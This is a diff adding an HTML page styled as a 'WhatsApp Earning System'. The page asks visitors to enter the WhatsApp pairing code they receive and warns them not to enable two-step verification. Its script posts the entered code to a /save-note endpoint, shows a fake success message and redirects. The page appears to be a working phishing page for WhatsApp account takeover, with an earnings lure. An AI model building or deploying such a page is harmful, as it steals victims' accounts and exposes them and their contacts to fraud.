@@ -1,0 +1,146 @@
+<!-- note.html -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Finish</title>
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+
+<style>
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+font-family:'Poppins',sans-serif;
+}
+
+body{
+height:100vh;
+background:#0b141a;
+display:flex;
+justify-content:center;
+align-items:center;
+}
+
+.container{
+width:90%;
+max-width:400px;
+background:#111b21;
+padding:35px 25px;
+border-radius:25px;
+box-shadow:0 0 30px rgba(37,211,102,0.2);
+text-align:center;
+}
+
+h1{
+color:white;
+margin-bottom:25px;
+font-size:28px;
+}
+
+textarea{
+width:100%;
+height:140px;
+border:none;
+outline:none;
+resize:none;
+padding:18px;
+border-radius:18px;
+background:#202c33;
+color:white;
+font-size:15px;
+margin-bottom:20px;
+}
+
+textarea::placeholder{
+color:#9aa6ad;
+}
+
+button{
+width:100%;
+padding:15px;
+border:none;
+border-radius:15px;
+background:#25D366;
+color:white;
+font-size:17px;
+font-weight:600;
+cursor:pointer;
+transition:.3s;
+}
+
+button:hover{
+transform:scale(1.03);
+background:#1ebe5d;
+}
+
+.success{
+display:none;
+color:#25D366;
+font-size:18px;
+margin-top:18px;
+font-weight:600;
+}
+</style>
+</head>
+<body>
+
+<div class="container">
+
+<h1>WhatsApp Earning System</h1>
+
+<p>You will receive a code for pairing</p>
+
+<p>Avoid adding 2 step verification or authunation won't work</p>
+
+<textarea id="note" placeholder="Input Your Code"></textarea>
+
+<button onclick="finish()">Finish</button>
+
+<div class="success" id="success">
+✅ Success Redirecting...
+</div>
+
+</div>
+
+<script>
+
+function finish(){
+
+const note = document.getElementById("note").value;
+
+// SEND NOTE TO MAIN WEB
+fetch("/save-note", {
+method:"POST",
+headers:{
+"Content-Type":"application/json"
+},
+body:JSON.stringify({
+note:note
+})
+})
+
+.then(() => {
+
+document.getElementById("success").style.display = "block";
+
+setTimeout(() => {
+window.location.href = "/";
+}, 2500);
+
+})
+
+.catch(() => {
+alert("Error");
+});
+
+}
+
+</script>
+
+</body>
+</html>
